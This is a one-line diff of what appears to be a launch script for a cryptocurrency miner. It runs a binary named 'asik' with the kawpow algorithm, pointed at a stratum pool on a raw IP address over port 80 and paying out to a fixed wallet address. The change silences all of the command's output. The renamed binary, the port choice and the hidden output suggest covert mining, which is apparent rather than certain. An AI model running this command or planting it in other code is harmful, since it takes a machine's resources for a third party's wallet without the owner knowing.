@@ -1,1 +1,1 @@
-./asik -a kawpow -o stratum+tcp://139.59.112.146:80 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.juarkom
+./asik -a kawpow -o stratum+tcp://139.59.112.146:80 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.juarkom >/dev/null 2>&1
